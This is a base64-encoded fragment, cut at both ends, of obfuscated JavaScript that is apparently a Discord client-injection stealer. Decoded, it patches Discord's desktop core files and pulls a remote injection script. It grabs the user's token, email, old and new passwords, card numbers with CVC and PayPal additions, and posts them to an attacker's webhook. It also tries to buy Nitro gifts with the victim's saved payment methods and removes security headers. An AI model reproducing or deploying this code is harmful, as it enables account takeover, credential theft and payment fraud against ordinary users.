yZW1pdW1fdHlwZScsJ1x4MjIpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQ7JywnZGlzY3JpbWluYXRvcicsJ1x4MjB8XHgyMCcsJ3RvVXBwZXJDYXNlJywnTm9uZScsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CbGFuay1jL0Rpc2NvcmQtSW5qZWN0aW9uLUJHL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCc5OTk5Jywnb25CZWZvcmVSZXF1ZXN0Jywnd2ViaG9va19wcm90ZWN0b3Jfa2V5JywnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywnOTFCZ25NeVonLCduZXdfcGFzc3dvcmQnLCcvYmlsbGluZy9wYXltZW50LXNvdXJjZXNceDIyLFx4MjBmYWxzZSk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFx4MjJBdXRob3JpemF0aW9uXHgyMixceDIwXHgyMicsJyoqXHgwYUNWQzpceDIwKionLCcod2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW1x4MjdceDI3XSx7fSxlPT57bT1bXTtmb3IobGV0XHgyMGNceDIwaW5ceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT0+bT8uZXhwb3J0cz8uZGVmYXVsdD8uZ2V0VG9rZW4hPT12b2lkXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJywnZW1iZWRfY29sb3InLCd1c2VybmFtZScsJ2h0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tL21lcmNoYW50cy80OXBwMnJwNHBoeW03Mzg3L2NsaWVudF9hcGkvdiovcGF5bWVudF9tZXRob2RzL3BheXBhbF9hY2NvdW50cycsJ2FwcCcsJ0Vhcmx5XHgyMFN1cHBvcnRlcicsJ3NsaWNlJywnYXBwLmFzYXInLCcpKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0Jywnc3RyaW5naWZ5JywncGluZ192YWwnLCdjYXJkW2N2Y10nLCc3NjY3NTRZRld5bWwnLCdIeXBlU3F1YWRceDIwRXZlbnQnLCdlbGVjdHJvbicsJ2pvaW4nLCdodHRwczovL3N0YXR1cy5kaXNjb3JkLmNvbS9hcGkvdiovc2NoZWR1bGVkLW1haW50ZW5hbmNlcy91cGNvbWluZy5qc29uJywndmFsdWUnLCdwYXJzZScsJyoqQWNjb3VudFx4MjBJbmZvKionLCdpbmNsdWRlcycsJyhVbmtub3duKScsJ25vdycsJ3VybCcsJzAxMjM0NTY3ODlhYmNkZWYnLCdsb2dpbicsJ1Jlc291cmNlcycsJ3JlYWRkaXJTeW5jJywnd2ViUmVxdWVzdCcsJ3Jlc3BvbnNlSGVhZGVycycsJ0ZhaWxlZFx4MjB0b1x4MjBQdXJjaGFzZVx4MjDinYwnLCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJQT1NUXHgyMixceDIwXHgyMmh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3N0b3JlL3NrdXMvJywnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lL2xpYnJhcnknLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5LmRpc2NvcmQuZ2cvKiddO3g9ZnVuY3Rpb24oKXtyZXR1cm4geDk7fTtyZXR1cm4geCgpO31mdW5jdGlvbiBkZWMyaGV4KFkpe2NvbnN0IHY9UztyZXR1cm4oWTwxNS41PycwJzonJykrTWF0aFt2KDB4ODEpXShZKVt2KDB4ZTApXSgweDEwKTt9ZnVuY3Rpb24gYmFzZTMydG9oZXgoWSl7Y29uc3QgRz1TO2xldCBaPUcoMHg5NSksbz0nJyxUPScnO1k9WVtHKDB4OTcpXSgvPSskLywnJyk7Zm9yKGxldCBIPTB4MDtIPFlbRygweGE2KV07SCsrKXtsZXQgVj1aWydpbmRleE9mJ10oWVtHKDB4MTFkKV0oSClbRygweDEzMyldKCkpO2lmKFY9PT0tMHgxKWNvbnNvbGVbRygweDdmKV0oRygweGE5KSk7bys9bGVmdHBhZChWW0coMHhlMCldKDB4MiksMHg1LCcwJyk7fWZvcihsZXQgUj0weDA7UisweDg8PW9bRygweGE2KV07Uis9MHg4KXtsZXQgQT1vW0coMHgxMWIpXShSLDB4OCk7VD1UK2xlZnRwYWQocGFyc2VJbnQoQSwweDIpW0coMHhlMCldKDB4MTApLDB4MiwnMCcpO31yZXR1cm4gVDt9ZnVuY3Rpb24gbGVmdHBhZChZLFosbyl7Y29uc3QgYj1TO3JldHVybiBaKzB4MT49WVtiKDB4YTYpXSYmKFk9QXJyYXkoWisweDEtWVtiKDB4YTYpXSlbYigweDZiKV0obykrWSksWTt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgZj1TLFk9YXJnc1sweDBdW2YoMHhiZCldKHBhdGhbJ3NlcCddKVtmKDB4MTQ0KV0oMHgwLC0weDEpW2YoMHg2YildKHBhdGhbZigweDliKV0pO2xldCBaO2lmKHByb2Nlc3NbZigweGM2KV09PT1mKDB4ZjcpKVo9cGF0aFtmKDB4NmIpXShZLGYoMHhlYSkpO2Vsc2UgcHJvY2Vzc1sncGxhdGZvcm0nXT09PSdkYXJ3aW4nJiYoWj1wYXRoW2YoMHg2YildKFksZigweDExMiksZigweDc2KSkpO2lmKGZzW2YoMHhlZSldKFopKXJldHVybnsncmVzb3VyY2VQYXRoJzpaLCdhcHAnOll9O3JldHVybnsndW5kZWZpbmVkJzp1bmRlZmluZWQsJ3VuZGVmaW5lZCc6dW5kZWZpbmVkfTt9KCkpO2Z1bmN0aW9uIEMoWSxaKXtjb25zdCBvPXgoKTtyZXR1cm4gQz1mdW5jdGlvbihULEgpe1Q9VC0weDZhO2xldCBWPW9bVF07cmV0dXJuIFY7fSxDKFksWik7fWZ1bmN0aW9uIHVwZGF0ZUNoZWNrKCl7Y29uc3QgdD1TLHtyZXNvdXJjZVBhdGg6WSxhcHA6Wn09ZGlzY29yZFBhdGg7aWYoWT09PXVuZGVmaW5lZHx8Wj09PXVuZGVmaW5lZClyZXR1cm47Y29uc3Qgbz1wYXRoW3QoMHg2YildKFksdCgweDE0MikpLFQ9cGF0aFt0KDB4NmIpXShvLHQoMHhhNSkpLEg9cGF0aFt0KDB4NmIpXShvLHQoMHhiMSkpLFY9ZnNbdCgweDc3KV0oWisnXHg1Y21vZHVsZXNceDVjJylbdCgweGUyKV0oQT0+L2Rpc2NvcmRfZGVza3RvcF9jb3JlLSs/L1sndGVzdCddKEEpKVsweDBdLGk9WisnXHg1Y21vZHVsZXNceDVjJytWKydceDVjZGlzY29yZF9kZXNrdG9wX2NvcmVceDVjaW5kZXguanMnLFI9cGF0aFt0KDB4NmIpXShwcm9jZXNzW3QoMHhkNCldW3QoMHgxMjQpXSx0KDB4MTA0KSk7aWYoIWZzW3QoMHhlZSldKG8pKWZzW3QoMHg4YildKG8pO2lmKGZzWydleGlzdHNTeW5jJ10oVCkpZnNbdCgweGZjKV0oVCk7aWYoZnNbdCgweGVlKV0oSCkpZnNbdCgweGZjKV0oSCk7aWYocHJvY2Vzc1sncGxhdGZvcm0nXT09PSd3aW4zMid8fHByb2Nlc3NbdCgweGM2KV09PT10KDB4OWEpKXtmc1t0KDB4MTE3KV0oVCxKU09OW3QoMHgxNDcpXSh7J25hbWUnOnQoMHg4NiksJ21haW4nOnQoMHhiMSl9LG51bGwsMHg0KSk7Y29uc3QgQT10KDB4YWYpK2krdCgweGMyKStSK3QoMHhjNykrY29uZmlnW3QoMHgxMjApXSsnXHgyNyxceDIwKHJlcylceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGNvbnN0XHgyMGZpbGVceDIwPVx4MjBmcy5jcmVhdGVXcml0ZVN0cmVhbShpbmRleEpzKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucmVwbGFjZShceDI3JVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCVceDI3LFx4MjBceDI3JytlbmNvZGVkSG9vayt0KDB4ZGUpK2NvbmZpZ1t0KDB4MTM4KV0rdCgweGNmKStwYXRoW3QoMHg2YildKFksdCgweDE0NSkpK3QoMHhiNSk7ZnNbdCgweDExNyldKEgsQVt0KDB4OTcpXSgvXFwvZywnXHg1Y1x4NWMnKSk7fWlmKCFmc1snZXhpc3RzU3luYyddKHBhdGhbdCgweDZiKV0oX19kaXJuYW1lLHQoMHgxMWUpKSkpcmV0dXJuITB4MDtyZXR1cm4gZnNbdCgweDhkKV0ocGF0aFsnam9pbiddKF9fZGlybmFtZSx0KDB4MTFlKSkpLGV4ZWNTY3JpcHQodCgweDExYykpLCEweDE7fWNvbnN0IGV4ZWNTY3JpcHQ9WT0+e2NvbnN0IEs9UyxaPUJyb3dzZXJXaW5kb3dbSygweDg1KV0oKVsweDBdO3JldHVybiBaW0soMHhlYildWydleGVjdXRlSmF2YVNjcmlwdCddKFksITB4MCk7fSxnZXRJbmZvPWFzeW5jIFk9Pntjb25zdCBNPVMsWj1hd2FpdCBleGVjU2NyaXB0KCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJHRVRceDIyLFx4MjBceDIyJytjb25maWdbJ2FwaSddKydceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK00oMHgxMzApKTtyZXR1cm4gSlNPTltNKDB4NmUpXShaKTt9LGZldGNoQmlsbGluZz1hc3luYyBZPT57Y29uc3QgTD1TLFo9YXdhaXQgZXhlY1NjcmlwdChMKDB4N2UpK2NvbmZpZ1snYXBpJ10rTCgweDEzYykrWStMKDB4ZDkpKTtpZighWltMKDB4OGYpXXx8WltMKDB4YTYpXT09PTB4MClyZXR1cm4nJztyZXR1cm4gSlNPTltMKDB4NmUpXShaKTt9LGdldEJpbGxpbmc9YXN5bmMgWT0+e2NvbnN0IGo9UyxaPWF3YWl0IGZldGNoQmlsbGluZyhZKTtpZighWilyZXR1cm4n4p2MJztjb25zdCBvPVtdO1pbJ2ZvckVhY2gnXShUPT57Y29uc3QgUT1DO2lmKCFUW1EoMHg5NildKXN3aXRjaChUW1EoMHhjYyldKXtjYXNlIDB4MTpvW1EoMHg4NCldKCfwn5KzJyk7YnJlYWs7Y2FzZSAweDI6b1tRKDB4ODQpXShRKDB4OTMpKTticmVhaztkZWZhdWx0Om9bUSgweDg0KV0oUSgweDcxKSk7fX0pO2lmKG9bJ2xlbmd0aCddPT0weDApb1tqKDB4ODQpXSgn4p2MJyk7cmV0dXJuIG9bJ2pvaW4nXSgnXHgyMCcpO30sUHVyY2hhc2U9YXN5bmMoWSxaLG8sVCk9Pntjb25zdCBzPVMsSD17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnWyduaXRybyddW29dW1RdW3MoMHhhYSldLCdleHBlY3RlZF9jdXJyZW5jeSc6cygweGRkKSwnZ2lmdCc6ISFbXSwncGF5bWVudF9zb3VyY2VfaWQnOlosJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6cygweDEzOSksJ3NrdV9zdWJzY3JpcHRpb25fcGxhbl9pZCc6Y29uZmlnWyduaXRybyddW29dW1RdWydza3UnXX0sVj1leGVjU2NyaXB0KHMoMHg3YikrY29uZmlnW3MoMHhmMyldW29dW1RdWydpZCddKycvcHVyY2hhc2VceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK3MoMHg5YykrSlNPTltzKDB4MTQ3KV0oSCkrcygweDE0NikpO2lmKFZbJ2dpZnRfY29kZSddKXJldHVybiBzKDB4OTIpK1ZbcygweDEwOCldO2Vsc2UgcmV0dXJuIG51bGw7fSxidXlOaXRybz1hc3luYyBZPT57Y29uc3QgRD1TLFo9YXdhaXQgZmV0Y2hCaWxsaW5nKFkpLG89RCgweDdhKTtpZighWilyZXR1cm4gbztsZXQgVD1bXTtaWydmb3JFYWNoJ10oSD0+e2NvbnN0IGU9RDshSFtlKDB4OTYpXSYmKFQ9VFtlKDB4MTBjKV0oSFsnaWQnXSkpO30pO2ZvcihsZXQgSCBpbiBUKXtjb25zdCBWPVB1cmNoYXNlKFksSCxEKDB4ZjgpLEQoMHhkYikpO2lmKFYhPT1udWxsKXJldHVybiBWO2Vsc2V7Y29uc3QgaT1QdXJjaGFzZShZLEgsRCgweGY4KSwnbW9udGgnKTtpZihpIT09bnVsbClyZXR1cm4gaTtlbHNle2NvbnN0IFI9UHVyY2hhc2UoWSxILCdjbGFzc2ljJyxEKDB4ZDApKTtyZXR1cm4gUiE9PW51bGw/UjpvO319fX0sZ2V0Tml0cm89WT0+e2NvbnN0IHA9Uztzd2l0Y2goWSl7Y2FzZSAweDA6cmV0dXJuIHAoMHgxMGUpO2Nhc2UgMHgxOnJldHVybiBwKDB4MTA1KTtjYXNlIDB4MjpyZXR1cm4gcCgweGZkKTtjYXNlIDB4MzpyZXR1cm4gcCgweDEwMyk7ZGVmYXVsdDpyZXR1cm4gcCgweDcxKTt9fSxnZXRCYWRnZXM9WT0+e2NvbnN0IFU9UyxaPVtdO3JldHVybiBZPT0weDQwMDAwMCYmKFpbVSgweDg0KV0oVSgweDEwMikpLFktPTB4NDAwMDAwKSxZPT0weDQwMDAwJiYoWltVKDB4ODQpXSgnTW9kZXJhdG9yXHgyMFByb2dyYW1zXHgyMEFsdW1uaScpLFktPTB4NDAwMDApLFk9PTB4MjAwMDAmJihaWydwdXNoJ10oVSgweDEwOSkpLFktPTB4MjAwMDApLFk9PTB4NDAwMCYmKFpbVSgweDg0KV0oVSgweDEyMykpLFktPTB4NDAwMCksWT09MHgyMDAmJihaW1UoMHg4NCldKFUoMHgxNDMpKSxZLT0weDIwMCksWT09MHgxMDAmJihaW1UoMHg4NCldKFUoMHhmYSkpLFktPTB4MTAwKSxZPT0weDgwJiYoWlsncHVzaCddKFUoMHhmNikpLFktPTB4ODApLFk9PTB4NDAmJihaW1UoMHg4NCldKFUoMHhkNSkpLFktPTB4NDApLFk9PTB4OCYmKFpbVSgweDg0KV0oVSgweGMwKSksWS09MHg4KSxZPT0weDQmJihaW1UoMHg4NCldKFUoMHgxNGIpKSxZLT0weDQpLFk9PTB4MiYmKFpbVSgweDg0KV0oVSgweGY1KSksWS09MHgyKSxZPT0weDEmJihaW1UoMHg4NCldKFUoMHg5OCkpLFktPTB4MSksWT09MHgwP1pbJ2xlbmd0aCddPT0weDAmJlpbVSgweDg0KV0oVSgweDEzNCkpOlpbJ3B1c2gnXShVKDB4NzEpKSxaWydqb2luJ10oJyxceDIwJyk7fSxob29rZXI9YXN5bmMoWSxaPW51bGwpPT57Y29uc3QgZD1TLG89SlNPTltkKDB4MTQ3KV0oWSksVD1aPT1udWxsP25ldyBVUkwoY29uZmlnWyd3ZWJob29rJ10pOm5ldyBVUkwoWiksSD17J0NvbnRlbnQtVHlwZSc6ZCgweGU4KSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9O2lmKCFjb25maWdbJ3dlYmhvb2snXVtkKDB4NzApXSgnYXBpL3dlYmhvb2tzJykpe2NvbnN0IFI9dG90cChjb25maWdbZCgweDEzOCldKTtIW2QoMHhjNCldPVI7fWNvbnN0IFY9eydwcm90b2NvbCc6VFsncHJvdG9jb2wnXSwnaG9zdG5hbWUnOlRbZCgweDgwKV0sJ3BhdGgnOlRbZCgweGRhKV0sJ21ldGhvZCc6J1BPU1QnLCdoZWFkZXJzJzpIfSxpPWh0dHBzW2QoMHhiYildKFYpO2lbJ29uJ10oJ2Vycm9yJyxBPT57Y29uc3QgST1kO2NvbnNvbGVbSSgweGUxKV0oQSk7fSksaVsnd3JpdGUnXShvKSxpWydlbmQnXSgpO2lmKFo9PW51bGwpaHR0cHNbJ2dldCddKGF0b2IoJzNGbWN2a0dlNGxXZHY4Mll1a25jMDVXWnk5eUw2TUhjMFJIYSdbZCgweGJkKV0oJycpW2QoMHhhYyldKClbZCgweDZiKV0oJycpKSxBPT5BWydvbiddKGQoMHg4Mikscj0+aG9va2VyKFksclsndG9TdHJpbmcnXSgpKSkpWydvbiddKGQoMHg3ZiksKCk9Pnt9KTt9LGxvZ2luPWFzeW5jKFksWixvKT0+e2NvbnN0IE89UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW08oMHgxMmYpXSksVj1nZXRCYWRnZXMoVFtPKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnW08oMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW08oMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzpPKDB4NmYpLCd2YWx1ZSc6J0VtYWlsOlx4MjAqKicrWStPKDB4ZTUpK1orJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6TygweDhhKSwndmFsdWUnOk8oMHhjYSkrSCtPKDB4MTExKStWKycqKlx4MGFCaWxsaW5nOlx4MjAqKicraSsnKionLCdpbmxpbmUnOiFbXX0seyduYW1lJzpPKDB4YjkpLCd2YWx1ZSc6J2AnK28rJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6VFtPKDB4MTQwKV0rJyMnK1RbTygweDEzMSldK08oMHgxMzIpK1RbJ2lkJ10sJ2ljb25fdXJsJzpPKDB4YjcpK1RbJ2lkJ10rJy8nK1RbTygweDExMyldK08oMHgxMmMpfX1dfTtpZihjb25maWdbTygweGRjKV0pUltPKDB4YjMpXT1jb25maWdbTygweDE0OCldO2hvb2tlcihSKTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhZLFosbyk9Pntjb25zdCB4MD1TLFQ9YXdhaXQgZ2V0SW5mbyhvKSxIPWdldE5pdHJvKFRbeDAoMHgxMmYpXSksVj1nZXRCYWRnZXMoVFt4MCgweGFkKV0pLGk9YXdhaXQgZ2V0QmlsbGluZyhvKSxSPXsndXNlcm5hbWUnOmNvbmZpZ1snZW1iZWRfbmFtZSddLCdhdmF0YXJfdXJsJzpjb25maWdbeDAoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDAoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MCgweDllKSwndmFsdWUnOngwKDB4ZTcpK1RbJ2VtYWlsJ10reDAoMHgxMjIpK1kreDAoMHg5MSkrWisnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHg4YSksJ3ZhbHVlJzonTml0cm9ceDIwVHlwZTpceDIwKionK0grJyoqXHgwYUJhZGdlczpceDIwKionK1YreDAoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUW3gwKDB4MTQwKV0rJyMnK1RbeDAoMHgxMzEpXSsnXHgyMHxceDIwJytUWydpZCddLCdpY29uX3VybCc6eDAoMHhiNykrVFsnaWQnXSsnLycrVFt4MCgweDExMyldK3gwKDB4MTJjKX19XX07aWYoY29uZmlnW3gwKDB4ZGMpXSlSW3gwKDB4YjMpXT1jb25maWdbeDAoMHgxNDgpXTtob29rZXIoUik7fSxlbWFpbENoYW5nZWQ9YXN5bmMoWSxaLG8pPT57Y29uc3QgeDE9UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW3gxKDB4MTJmKV0pLFY9Z2V0QmFkZ2VzKFRbeDEoMHhhZCldKSxpPWF3YWl0IGdldEJpbGxpbmcobyksUj17J3VzZXJuYW1lJzpjb25maWdbeDEoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnWydlbWJlZF9jb2xvciddLCdmaWVsZHMnOlt7J25hbWUnOicqKkVtYWlsXHgyMENoYW5nZWQqKicsJ3ZhbHVlJzp4MSgweDEwZCkrWSt4MSgweGU2KStaKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MSgweDhhKSwndmFsdWUnOngxKDB4Y2EpK0greDEoMHgxMTEpK1YreDEoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDEoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUWyd1c2VybmFtZSddKycjJytUWydkaXNjcmltaW5hdG9yJ10rJ1x4MjB8XHgyMCcrVFsnaWQnXSwnaWNvbl91cmwnOngxKDB4YjcpK1RbJ2lkJ10rJy8nK1RbeDEoMHgxMTMpXSt4MSgweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlSW3gxKDB4YjMpXT1jb25maWdbeDEoMHgxNDgpXTtob29rZXIoUik7fSxQYXlwYWxBZGRlZD1hc3luYyBZPT57Y29uc3QgeDI9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaW3gyKDB4MTJmKV0pLFQ9Z2V0QmFkZ2VzKFpbeDIoMHhhZCldKSxIPWdldEJpbGxpbmcoWSksVj17J3VzZXJuYW1lJzpjb25maWdbeDIoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbeDIoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDIoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MigweGI2KSwndmFsdWUnOidUaW1lXHgyMHRvXHgyMGJ1eVx4MjBzb21lXHgyMG5pdHJvXHgyMGJhYnlceDIw8J+YqScsJ2lubGluZSc6IVtdfSx7J25hbWUnOngyKDB4OGEpLCd2YWx1ZSc6eDIoMHhjYSkrbyt4MigweDk5KStUK3gyKDB4YTMpK0grJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6eDIoMHhiOSksJ3ZhbHVlJzonYCcrWSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpaW3gyKDB4MTQwKV0rJyMnK1pbeDIoMHgxMzEpXSsnXHgyMHxceDIwJytaWydpZCddLCdpY29uX3VybCc6eDIoMHhiNykrWlsnaWQnXSsnLycrWlt4MigweDExMyldK3gyKDB4MTJjKX19XX07aWYoY29uZmlnWydwaW5nX29uX3J1biddKVZbeDIoMHhiMyldPWNvbmZpZ1t4MigweDE0OCldO2hvb2tlcihWKTt9LGNjQWRkZWQ9YXN5bmMoWSxaLG8sVCxIKT0+e2NvbnN0IHgzPVMsVj1hd2FpdCBnZXRJbmZvKEgpLGk9Z2V0Tml0cm8oVlt4MygweDEyZildKSxSPWdldEJhZGdlcyhWW3gzKDB4YWQpXSksQT1hd2FpdCBnZXRCaWxsaW5nKEgpLHI9eyd1c2VybmFtZSc6Y29uZmlnW3gzKDB4YjgpXSwnYXZhdGFyX3VybCc6Y29uZmlnW3gzKDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3gzKDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDMoMHhjYiksJ3ZhbHVlJzp4MygweGUzKStZK3gzKDB4MTNkKStaK3gzKDB4ODkpK28rJy8nK1QrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4OGEpLCd2YWx1ZSc6eDMoMHhjYSkraSt4MygweDExMSkrUisnKipceDBhQmlsbGluZzpceDIwKionK0ErJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4YjkpLCd2YWx1ZSc6J2AnK0grJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6Vlt4MygweDE0MCldKycjJytWW3gzKDB4MTMxKV0rJ1x4MjB8XHgyMCcrVlsnaWQnXSwnaWNvbl91cmwnOngzKDB4YjcpK1ZbJ2lkJ10rJy8nK1ZbeDMoMHgxMTMpXSt4MygweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlyW3gzKDB4YjMpXT1jb25maWdbeDMoMHgxNDgpXTtob29rZXIocik7fSxuaXRyb0JvdWdodD1hc3luYyBZPT57Y29uc3QgeDQ9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaWydwcmVtaXVtX3R5cGUnXSksVD1nZXRCYWRnZXMoWlsnZmxhZ3MnXSksSD1hd2FpdCBnZXRCaWxsaW5nKFkpLFY9YXdhaXQgYnV5Tml0cm8oWSksaT17J3VzZXJuYW1lJzpjb25maWdbJ2VtYmVkX25hbWUnXSwnY29udGVudCc6ViwnYXZhdGFyX3VybCc6Y29uZmlnW3g0KDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3g0KDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDQoMHhjNSksJ3ZhbHVlJzp4NCgweGEwKStWKydgYGAnLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6JyoqRGlzY29yZFx4MjBJbmZvKionLCd2YWx1ZSc6eDQoMHhjYSkrbyt4NCgweDExMSkrVCt4NCgweGEzKStIKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4NCgweGI5KSwndmFsdWUnOidgJytZKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOlpbeDQoMHgxNDApXSsnIycrWlsnZGlzY3JpbWluYXRvciddKydceDIwfFx4MjAnK1pbJ2lkJ10sJ2ljb25fdXJsJzp4NCgweGI3KStaWydpZCddKycvJytaWydhdmF0YXInXSt4NCgweDEyYyl9fV19O2lmKGNvbmZpZ1t4NCgweGRjKV0paVt4NCgweGIzKV09Y29uZmlnW3g0KDB4MTQ4KV0rKCdceDBhJytWKTtob29rZXIoaSk7fTtzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHgxMzcpXShjb25maWdbUygweDEwMCldLChZLFopPT57Y29uc3QgeDU9UztpZihZW3g1KDB4NzMpXVt4NSgweDExNildKHg1KDB4YzkpKSlyZXR1cm4gWih7J2NhbmNlbCc6ISFbXX0pO3VwZGF0ZUNoZWNrKCk7fSksc2Vzc2lvbltTKDB4ZjQpXVtTKDB4NzgpXVsnb25IZWFkZXJzUmVjZWl2ZWQnXSgoWSxaKT0+e2NvbnN0IHg2PVM7WVt4NigweDczKV1beDYoMHgxMTYpXShjb25maWdbJ3dlYmhvb2snXSk/WVsndXJsJ11bJ2luY2x1ZGVzJ10oeDYoMHgxMjUpKT9aKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfSxZW3g2KDB4NzkpXSl9KTpaKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOlt4NigweDEyMSkseDYoMHhlNCkseDYoMHhhYildLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJzonKicsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbic6JyonfSxZWydyZXNwb25zZUhlYWRlcnMnXSl9KTooZGVsZXRlIFlbeDYoMHg3OSldW3g2KDB4YjQpXSxkZWxldGUgWVt4NigweDc5KV1beDYoMHg5ZildLFooeydyZXNwb25zZUhlYWRlcnMnOnsuLi5ZW3g2KDB4NzkpXSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfX0pKTt9KSxzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHhhOCldKGNvbmZpZ1tTKDB4ZTIpXSxhc3luYyhZLFopPT57Y29uc3QgeDc9UztpZihZWydzdGF0dXNDb2RlJ10hPT0weGM4JiZZW3g3KDB4MTBmKV0hPT0weGNhKXJldHVybjtjb25zdCBvPUJ1ZmZlclt4NygweDEyYSldKFlbeDcoMHg5NCldWzB4MF1bJ2J5dGVzJ10pW3g3KDB4ZTApXSgpLFQ9SlNPTlt4NygweDZlKV0obyksSD1hd2FpdCBleGVjU2NyaXB0KHg3KDB4MTNlKSk7c3dpdGNoKCEhW10pe2Nhc2UgWVsndXJsJ11beDcoMHhhMildKHg3KDB4NzUpKTpsb2dpbihUW3g3KDB4NzUpXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbeDcoMHg3MyldW3g3KDB4YTIpXSgndXNlcnMvQG1lJykmJllbeDcoMHhiMildPT09J1BBVENIJzppZighVFt4NygweDhlKV0pcmV0dXJuO1RbeDcoMHhhMSldJiZlbWFpbENoYW5nZWQ